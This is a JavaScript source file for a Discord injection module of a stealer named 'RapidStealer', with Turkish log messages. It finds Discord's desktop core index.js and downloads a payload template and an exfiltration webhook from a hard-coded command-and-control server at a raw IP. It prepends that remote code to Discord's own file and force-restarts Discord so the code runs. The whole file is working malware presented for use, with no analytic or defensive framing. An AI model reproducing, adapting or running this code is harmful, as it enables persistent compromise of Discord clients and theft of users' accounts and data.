// ======================================================================
// RapidStealer — Discord Injection Module
// ======================================================================

'use strict';
const fs = require('fs');
const path = require('path');
const http = require('http');

// ======================================================================
// CONFIGURATION
// ======================================================================

const BUILD_KEY = 'RAPD-D354-GHLG-E5D6-I7XZ-2026';
const C2_HOST = '46.151.182.157';
const C2_PORT = 1337;
const DOWNLOAD_PATH = '/api/discord';
const WEBHOOK_PROVISION_PATH = '/webhook';
const HTTP_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';

// ======================================================================
// 1. DISCORD CORE DIRECTORY LOCATOR
// ======================================================================

const DISCORD_BASE_PATHS = [
  process.env.LOCALAPPDATA + '\\Discord',
  process.env.LOCALAPPDATA + '\\DiscordCanary',
  process.env.LOCALAPPDATA + '\\DiscordPTB',
  process.env.LOCALAPPDATA + '\\DiscordDevelopment',
];

function findDiscordCoreIndex() {
  for (const base of DISCORD_BASE_PATHS) {
    if (!fs.existsSync(base)) continue;
    try {
      const items = fs.readdirSync(base);
      const appDir = items.find(d => d.startsWith('app-'));
      if (!appDir) continue;
      const coreRoot = path.join(base, appDir, 'modules', 'discord_desktop_core-1');
      if (!fs.existsSync(coreRoot)) continue;
      for (const entry of fs.readdirSync(coreRoot)) {
        const indexPath = path.join(coreRoot, entry, 'discord_desktop_core', 'index.js');
        if (fs.existsSync(indexPath)) return indexPath;
      }
    } catch (e) {}
  }
  return null;
}

// ======================================================================
// 2. C2 COMMUNICATION
// ======================================================================

function fetchFromC2(path) {
  return new Promise((resolve, reject) => {
    http.get({
      hostname: C2_HOST, port: C2_PORT, path, headers: { 'User-Agent': HTTP_UA },
      timeout: 15000,
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

function getWebhookUrl() {
  return fetchFromC2(WEBHOOK_PROVISION_PATH + '?key=' + BUILD_KEY)
    .then(raw => {
      const parsed = JSON.parse(raw);
      return (parsed.success && parsed.webhook) ? parsed.webhook : '';
    })
    .catch(() => '');
}
function downloadPayloadTemplate() { return fetchFromC2(DOWNLOAD_PATH); }

// ======================================================================
// 3. INJECTION PIPELINE
// ======================================================================

async function prepareAndInjectPayload(indexPath) {
  console.log('[INFO] Discord enjeksiyon iÅŸlemi baÅŸlatÄ±lÄ±yor...');

  // Fetch payload template and webhook URL concurrently
  const [template, webhookUrl] = await Promise.all([
    downloadPayloadTemplate().catch(() => null),
    getWebhookUrl().catch(() => null),
  ]);

  if (!template) { console.error('[ERROR] Payload indirilemedi'); return false; }

  // Substitute webhook placeholder 
  const payload = template.replace(/%WEBHOOK%/g, webhookUrl || '');

  try {
    let content = fs.readFileSync(indexPath, 'utf8');
    if (content.includes('// [RAPID_INJECT]')) {
      console.log('[INFO] Discord zaten enjekte edilmiÅŸ');
      return true;
    }

    fs.copyFileSync(indexPath, indexPath + '.bak');

    const injectBlock = [
      '// [RAPID_INJECT]',
      '(function(){try{',
      payload,
      '}catch(_e){console.error("[RAPID_INJECT]",_e)}})();',
      '// [RAPID_INJECT_END]',
      '\n',
    ].join('\n');

    fs.writeFileSync(indexPath, injectBlock + content);
    console.log('[INFO] Enjeksiyon baÅŸarÄ±lÄ±');
    return true;
  } catch (e) {
    console.error('[ERROR] Enjeksiyon baÅŸarÄ±sÄ±z:', e.message);
    return false;
  }
}

// ======================================================================
// 4. DISCORD RESTART
// ======================================================================

function restartDiscord() {
  const { execSync } = require('child_process');
  for (const name of ['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe']) {
    try { execSync('taskkill /IM ' + name + ' /F >nul 2>&1'); } catch (e) {}
  }
  try {
    execSync(
      'start "" "' + process.env.LOCALAPPDATA + '\\Discord\\Update.exe" --processStart Discord.exe',
      { windowsHide: true }
    );
  } catch (e) {}
}

// ======================================================================
// 5. ORCHESTRATOR
// ======================================================================

async function main() {
  console.log('[INFO] Discord enjeksiyon iÅŸlemi baÅŸlatÄ±lÄ±yor...');

  const indexPath = findDiscordCoreIndex();
  if (!indexPath) {
    console.error('[ERROR] Discord core dizini bulunamadÄ±');
    return;
  }

  const success = await prepareAndInjectPayload(indexPath);
  if (!success) return;

  restartDiscord();
  console.log('[INFO] Discord yeniden baÅŸlatÄ±lÄ±yor...');
}

main();
